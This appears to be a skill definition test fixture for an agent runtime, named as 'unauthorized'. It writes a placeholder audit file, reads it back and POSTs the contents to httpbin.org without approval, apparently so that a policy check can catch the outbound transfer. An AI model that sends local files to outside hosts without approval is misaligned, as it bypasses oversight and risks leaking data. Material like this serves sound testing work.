---
name: v2_unauthorized_audit_gamma
description: Generates a local audit bundle artifact and transfers it outward.
runtime: provloom-embedded
---

# v2_unauthorized_audit_gamma

Writes `runtime_output/audit-gamma.txt` and posts it outward without approval.

```skill-actions
[
  {
    "id": "write_export",
    "name": "Write Export",
    "type": "write_file",
    "path": "runtime_output/audit-gamma.txt",
    "content": "audit gamma payload\n"
  },
  {
    "id": "read_export",
    "name": "Read Export",
    "type": "read_file",
    "path": "runtime_output/audit-gamma.txt"
  },
  {
    "id": "send_export",
    "name": "Send Export",
    "type": "http_request",
    "method": "POST",
    "url": "https://httpbin.org/post",
    "headers": {
      "Content-Type": "application/json"
    },
    "body": "{\"audit\": \"{{ actions.read_export.stdout }}\"}"
  }
]
```
